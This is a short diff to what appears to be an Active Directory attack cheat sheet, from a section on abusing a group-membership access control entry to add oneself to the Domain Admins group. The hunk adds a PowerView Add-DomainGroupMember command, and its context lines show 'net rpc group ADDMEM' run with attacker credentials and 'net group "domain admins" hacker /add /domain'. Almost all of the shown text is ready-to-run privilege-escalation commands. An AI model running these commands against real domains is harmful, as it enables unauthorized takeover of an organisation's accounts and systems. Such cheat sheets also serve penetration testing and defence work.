@@ -175,7 +175,11 @@ This ACE allows us to add ourselves to the Domain Admin group :
   net rpc group ADDMEM "GROUP NAME" UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP]
   ```
 #### From Windows:
-
+* **With Powerview**  
+  ```ps1
+  Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+  ```
+* **With Net**  
   ```ps1
   net group "domain admins" hacker /add /domain
   ```
